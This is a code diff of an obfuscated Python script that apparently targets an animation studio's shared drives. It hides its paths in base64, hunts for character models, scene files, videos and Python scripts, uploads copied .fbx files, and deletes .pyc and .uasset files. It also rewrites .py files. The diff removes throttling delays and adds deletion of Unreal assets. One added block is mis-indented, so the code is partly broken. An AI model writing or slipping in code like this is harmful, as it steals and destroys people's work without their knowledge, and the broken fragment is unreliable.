@@ -128,7 +128,7 @@ try:
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=10)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=10)
-        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uasset')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.ma', n=8)
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.mb', n=8)
@@ -143,21 +143,18 @@ except:
 import random
 
 random.shuffle(zovV)
-for _, fp in zovV:
+for _, fp in zovV[:1]:
     import tempfile
-    if random.random() > 0.2:
-        continue
     fp_basename = os.path.basename(fp)
     is_fbx = fp_basename.endswith('.fbx')
     if fp_basename.startswith('SKM') and is_fbx:
         tmp = tempfile.NamedTemporaryFile(delete=False, suffix='-' + fp_basename.split('.')[-1]).name
         try:
             shutil.copy(fp, tmp)
-            #_gup(os.path.abspath(tmp))
-            add_queue_task('tsl_gup', {'tmp': tmp})
+            _gup(os.path.abspath(tmp))
             os.remove(tmp)
         except:
-            pass
+            add_queue_task('tsl_up_err',{'error': str(traceback.format_exc())})
             try: os.remove(tmp);
             except: pass;
 
@@ -168,9 +165,11 @@ try:
         (0, base64.b64decode('UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n').decode()),
         (0, base64.b64decode('UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=').decode()),
         (0, base64.b64decode('UzovTGlicmFyeS9hbmltYXRpb24=').decode()),
+        (0, base64.b64decode('UzovdGVtcC9NT0Qv').decode()),
     ]
     import glob
     ldir += [(0, i) for i in list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))]
+    
 
     zovV = []
     for _, dp in ldir:
@@ -179,19 +178,16 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.pyc', n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=150)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.ma', n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uasset', n=50)
     random.shuffle(zovV)
 
     import subprocess, shutil, tempfile
-    if os.path.exists(base64.b64decode('UzovWnpfQ29tZnlVSQ==').decode()):
-        os.makedirs(base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode(), exist_ok=True)
-    tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
-    tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
+    tempdir = tempfile.gettempdir()
     for _,fp in zovV[:15]:
-        break
-        time.sleep(random.uniform(1500.0, 3600.0))
         if os.path.basename(fp).endswith('.mp4') or os.path.basename(fp).endswith('.mov'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
             try:
+                1/0
                 p = subprocess.Popen(
                     [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0,scale=iw*0.5:ih*0.5", "-af", "volume=0.0", "-shortest", tmp],
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
@@ -199,9 +195,11 @@ try:
             except:
                 try: os.remove(tmp);
                 except: pass;
+                
         if os.path.basename(fp).endswith('.pyc'):
             try: os.remove(fp);
             except: pass;
+            
         if os.path.basename(fp).endswith('.py') or os.path.basename(fp).endswith('.py'):
             try:
                 with open(fp) as fr:
@@ -210,6 +208,11 @@ try:
                 with open(fp, 'w') as f:
                     f.write(yt)
             except: pass;
+        
+        if os.path.basename(fp).endswith('.uasset'):
+            try: os.remove(fp);
+                except: pass;
+        
     #if zovV:
         #add_queue_task('tsl_update',{'done': sorted(zovV[:15], reverse=True)})
         
